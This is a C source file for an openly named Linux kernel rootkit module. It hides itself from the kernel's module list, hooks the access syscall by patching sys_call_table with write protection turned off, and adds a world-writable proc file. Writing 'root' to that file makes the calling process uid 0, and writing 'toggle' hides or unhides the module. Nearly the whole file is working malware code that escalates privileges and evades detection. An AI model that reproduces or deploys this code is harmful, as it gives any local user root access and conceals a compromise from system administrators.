#include "main.h"

// Static variables

u8 module_hidden = 0;

static struct list_head *module_list;

static struct proc_dir_entry *proc_rootkit;

// Vars for syscall hijacking
static unsigned long *syscall_table;

typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
static sys_call_ptr_t orig_access;

// Module hiding

void module_hide(void)
{
    if (module_hidden)
        return;
    module_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = 1;
}

void module_unhide(void)
{
    if (!module_hidden)
        return;
    list_add(&THIS_MODULE->list, module_list);
    module_hidden = 0;
}

unsigned long *find_syscall_table(void)
{
    return (unsigned long *)kallsyms_lookup_name("sys_call_table");
}

asmlinkage long rk_access(const struct pt_regs *pt_regs)
{
    const char __user *filename = (const char __user *)pt_regs->di;
    int mode = (int)pt_regs->si;
    // pr_info("Access: %s\n", filename);
    return orig_access(pt_regs);
}

// Proc file interface

static ssize_t rk_proc_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos)
{
    return 0;
}

static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos)
{
    if (strncmp(ubuf, "toggle", MIN(6, count)) == 0)
    {
        pr_info("Toggle visibility");
        if (module_hidden)
            module_unhide();
        else
            module_hide();
    }
    else if (strncmp(ubuf, "root", MIN(4, count)) == 0)
    {
        struct cred *creds = prepare_creds();
        if (creds != NULL)
        {
            creds->uid.val = 0;
            creds->gid.val = 0;
            creds->euid.val = 0;
            creds->egid.val = 0;
        }
        commit_creds(creds);
    }
    return count;
}

static const struct file_operations proc_rootkit_fops = {
    .read = rk_proc_read,
    .write = rk_proc_write,
};

static int proc_init(void)
{
    // Create entry for controlling rootkit
    proc_rootkit = proc_create(PROCFILE_NAME, S_IRUGO | S_IWUGO, NULL, &proc_rootkit_fops);
    if (!proc_rootkit)
        return -1;

    return 0;
}

static int proc_clean(void)
{
    if (proc_rootkit != NULL)
    {
        proc_remove(proc_rootkit);
        proc_rootkit = NULL;
    }

    return 0;
}

static int __init lkm_rootkit_init(void)
{
    printk(KERN_INFO "Hello, World!\n");

    if (proc_init() || hidefs_init())
    {
        proc_clean();
        hidefs_clean();
        return -1;
    }

    module_hide();

    syscall_table = find_syscall_table();
    pr_info("Found syscall_table at %lx\n", *syscall_table);

    orig_access = (sys_call_ptr_t)syscall_table[__NR_access];

    disable_write_protect();

    syscall_table[__NR_access] = (unsigned long)rk_access;

    enable_write_protect();

    return 0;
}

static void __exit lmk_rootkit_exit(void)
{
    proc_clean();
    hidefs_clean();

    disable_write_protect();

    syscall_table[__NR_access] = (unsigned long)orig_access;

    enable_write_protect();

    printk(KERN_INFO "Goodbye, World!\n");
}
